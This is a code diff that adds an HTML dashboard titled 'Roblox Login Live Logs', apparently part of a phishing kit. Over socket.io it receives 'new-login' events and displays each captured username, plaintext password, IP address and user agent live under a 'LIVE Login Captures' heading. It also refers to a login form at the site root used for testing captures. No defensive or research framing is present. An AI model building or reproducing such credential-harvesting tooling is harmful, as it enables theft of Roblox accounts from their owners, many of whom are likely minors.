@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Login Live Logs</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
+      background: #121215; 
+      color: #f7f7f8; 
+      min-height: 100vh;
+    }
+    .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+    h1 { 
+      color: #39c582; 
+      margin-bottom: 30px; 
+      font-size: 2.5em; 
+      text-align: center;
+      text-shadow: 0 0 20px rgba(57, 197, 130, 0.5);
+    }
+    #logs { 
+      list-style: none; 
+      display: flex; 
+      flex-direction: column; 
+      gap: 12px; 
+    }
+    .log-item { 
+      background: rgba(25, 26, 31, 0.8); 
+      border-radius: 12px; 
+      padding: 20px; 
+      border-left: 4px solid #39c582; 
+      animation: slideIn 0.3s ease-out;
+      backdrop-filter: blur(10px);
+    }
+    .log-item .username { font-weight: 700; color: #39c582; }
+    .log-item .password { font-weight: 600; color: #f7f7f8; font-family: monospace; }
+    .log-item .timestamp { color: #a3a6ad; font-size: 0.9em; margin-bottom: 8px; }
+    .log-item .details { color: #d5d7dd; font-size: 0.85em; }
+    @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+    .status { text-align: center; padding: 20px; color: #a3a6ad; }
+    .empty { text-align: center; padding: 60px; color: #a3a6ad; font-size: 1.2em; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔴 LIVE Login Captures</h1>
+    <div id="status" class="status">Connecting to live logs...</div>
+    <ul id="logs"></ul>
+    <div id="empty" class="empty" style="display: none;">No captures yet. Submit login on / to test!</div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+    const logs = document.getElementById('logs');
+    const status = document.getElementById('status');
+    const empty = document.getElementById('empty');
+
+    socket.on('connect', () => {
+      status.textContent = `✅ Connected - Live logs active (ID: ${socket.id.slice(0,8)}...)`;
+      status.style.color = '#39c582';
+    });
+
+    socket.on('status', (msg) => {
+      status.textContent = msg;
+    });
+
+    socket.on('new-login', (data) => {
+      empty.style.display = 'none';
+      const item = document.createElement('li');
+      item.className = 'log-item';
+      item.innerHTML = `
+        <div class="timestamp">${new Date(data.timestamp).toLocaleString()}</div>
+        <div><span class="username">👤 ${data.username}</span></div>
+        <div><span class="password">🔑 ${data.password}</span></div>
+        <div class="details">🌐 ${data.ip} • 💻 ${data.userAgent.slice(0,50)}...</div>
+      `;
+      logs.insertBefore(item, logs.firstChild);
+      
+      // Keep only last 50 logs
+      while (logs.children.length > 50) logs.removeChild(logs.lastChild);
+    });
+
+    socket.on('disconnect', () => {
+      status.textContent = '❌ Disconnected - Refresh to reconnect';
+      status.style.color = '#dc3545';
+    });
+  </script>
+</body>
+</html>
